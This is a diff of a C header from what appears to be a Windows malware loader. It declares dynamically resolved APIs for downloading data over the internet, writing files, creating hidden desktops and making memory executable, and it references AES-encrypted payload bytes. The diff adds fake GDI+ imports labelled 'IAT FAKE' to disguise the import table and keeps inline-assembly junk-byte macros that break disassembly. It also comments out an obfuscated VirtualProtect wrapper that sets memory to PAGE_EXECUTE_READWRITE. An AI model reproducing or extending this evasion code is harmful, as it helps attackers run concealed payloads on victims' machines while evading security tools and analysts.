@@ -3,13 +3,17 @@
 
 #include "config.h"
 
-#ifdef DEBUG
-#include <stdio.h>
-#endif
 
 extern void setTrapFlag(void);
 extern void stepOverExit(void);
 extern void appendByteExit(void);
+
+#define FORCE_INLINE __attribute__((always_inline)) inline
+
+// IAT FAKE
+#include <objidl.h>
+#include <gdiplus.h>
+// END
 
 #include <windows.h>
 #include "../crypto/aes.h"
@@ -36,7 +40,7 @@ typedef NTSTATUS(NTAPI* pLdrLoadDll) (
 
 typedef unsigned int (*payload)(unsigned long long*);
 typedef WINBOOL (NTAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-typedef void (WINAPI*pGetSystemTime)(void);
+typedef VOID (WINAPI*pGetSystemTime)(void);
 typedef HANDLE (WINAPI*pCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 typedef WINBOOL (WINAPI*pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 typedef WINBOOL (WINAPI*pCloseHandle)(HANDLE hObject);
@@ -45,11 +49,12 @@ typedef HINTERNET (WINAPI*pInternetOpenUrlA)(HINTERNET hInternet, LPCSTR lpszUrl
 typedef WINBOOL (WINAPI*pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
 typedef WINBOOL (WINAPI*pInternetCloseHandle)(HINTERNET hInternet);
 typedef DWORD (WINAPI*pGetLastError)(void);
-typedef void (WINAPI*pExitProcess)(UINT uExitCode);
+typedef VOID (WINAPI*pExitProcess)(UINT uExitCode);
 typedef HDESK (WINAPI*pCreateDesktopW)(LPCWSTR lpszDesktop, LPCWSTR lpszDevice, LPDEVMODEW pDevmode, DWORD dwFlags, ACCESS_MASK dwDesiredAccess, LPSECURITY_ATTRIBUTES lpsa);
 typedef WINBOOL (WINAPI*pSetThreadDesktop)(HDESK hDesktop);
 typedef HANDLE (WINAPI*pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 typedef WINBOOL (WINAPI*pCloseDesktop)(HANDLE hObject);
+typedef VOID (NTAPI*pRtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
 
 #define TOMFOOLERY asm volatile(\
         "call appendByte2Rip\n\t"\
@@ -84,29 +89,30 @@ typedef WINBOOL (WINAPI*pCloseDesktop)(HANDLE hObject);
     ".byte 0x9a\n\t"\
 );
 
-#define DYNAMIC_RETURN asm volatile(\
-    ".byte 0xe8\n\t"\
-    ".word 0x0001\n\t"\
-    ".word 0x0000\n\t"\
-    ".byte 0x9a\n\t"\
-    "pop %%rax\n\t"\
-    "add $9, %%rax\n\t"\
-    "push %%rax\n\t"\
-    "ret\n\t"\
-    ".byte 0x9a\n\t"\
-    ::: "%rax"\
-)
+// #define DYNAMIC_RETURN asm volatile(\
+//     ".byte 0xe8\n\t"\
+//     ".word 0x0002\n\t"\
+//     ".word 0x0000\n\t"\
+//     ".word 0x8e7d\n\t"\
+//     "pop %%rax\n\t"\
+//     "add $16, %%rax\n\t"\
+//     "xor $0xf8145, %%r9\n\t"\
+//     "push %%rax\n\t"\
+//     "ret\n\t"\
+//     ".byte 0x9a\n\t"\
+//     ::: "%rax","%r9"\
+// )
 // VirtualProtect(execute_me, sizeof(payload_enc_bytes), PAGE_EXECUTE_READWRITE, junk);
-#define VIRT_PROTECT_OBF(data, size, perms, junk_ptr) asm volatile(\
-        "mov %0, %%rcx\n\t"\
-        "mov %1, %%edx\n\t"\
-        "mov %2, %%r8d\n\t"\
-        "mov %3, %%r9\n\t"\
-        "call callSecretWIN\n\t"\
-        ".byte 0x64\n\t"\
-        "call VirtualProtect\n\t"\
-        : : "r" (data), "i" (size), "i" (perms), "r" (junk_ptr) : "%rdi"\
-);
+// #define VIRT_PROTECT_OBF(data, size, perms, junk_ptr) asm volatile(\
+//         "mov %0, %%rcx\n\t"\
+//         "mov %1, %%edx\n\t"\
+//         "mov %2, %%r8d\n\t"\
+//         "mov %3, %%r9\n\t"\
+//         "call callSecretWIN\n\t"\
+//         ".byte 0x9a\n\t"\
+//         "call VirtualProtect\n\t"\
+//         : : "r" (data), "i" (size), "i" (perms), "r" (junk_ptr) : "%rdi"\
+// );
 
 HMODULE _LoadLibrary(LPCWSTR lpFileName);
 HMODULE _GetModuleHandle(LPCWSTR lModuleName);
